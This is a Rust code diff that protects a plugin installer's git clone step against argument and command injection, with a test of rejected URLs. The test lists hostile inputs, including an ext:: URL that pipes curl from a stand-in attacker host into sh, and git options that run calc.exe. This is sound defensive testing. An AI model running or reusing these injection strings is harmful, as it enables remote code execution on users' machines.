@@ -329,8 +329,25 @@ impl PluginInstaller {
         }
         if source.starts_with("git+") || source.ends_with(".git") {
             let url = source.strip_prefix("git+").unwrap_or(source);
+
+            // Prevent argument injection
+            if url.starts_with('-') {
+                return Err(MarketplaceError::InstallFailed(
+                    "Invalid git URL: cannot start with '-'".to_string(),
+                ));
+            }
+
+            // Prevent command injection (e.g., via ext::)
+            let valid_prefixes = ["https://", "http://", "git://", "ssh://", "git@", "file://"];
+            if !valid_prefixes.iter().any(|prefix| url.starts_with(prefix)) {
+                return Err(MarketplaceError::InstallFailed(
+                    "Invalid git URL scheme".to_string(),
+                ));
+            }
+
             std::process::Command::new("git")
                 .arg("clone")
+                .arg("--")
                 .arg(url)
                 .arg(&target)
                 .output()
@@ -907,5 +924,37 @@ mod tests {
             other => panic!("expected IntegrityCheckFailed, got {other:?}"),
         }
         assert!(!installer.is_installed("demo-plugin"));
+    }
+
+    #[test]
+    fn test_install_rejects_malicious_git_urls() {
+        let tmp = TempDir::new().unwrap();
+        let installer = PluginInstaller::new(tmp.path().join("plugins"));
+        let mut manifest = sample_manifest();
+        manifest.sha256 = Some("ignored".to_string());
+
+        let malicious_urls = vec![
+            "git+ext::sh -c 'curl http://attacker.com | sh'",
+            "git+--upload-pack=foo",
+            "git+-oProxyCommand=calc.exe",
+            "git+--config=core.pager=calc.exe",
+        ];
+
+        for url in malicious_urls {
+            let err = installer.install(&manifest, url).unwrap_err();
+            assert!(
+                matches!(err, MarketplaceError::InstallFailed(_)),
+                "Expected InstallFailed for malicious URL: {}",
+                url
+            );
+            if let MarketplaceError::InstallFailed(msg) = err {
+                assert!(
+                    msg.contains("Invalid git URL"),
+                    "Error message should mention 'Invalid git URL' for {}: {}",
+                    url,
+                    msg
+                );
+            }
+        }
     }
 }
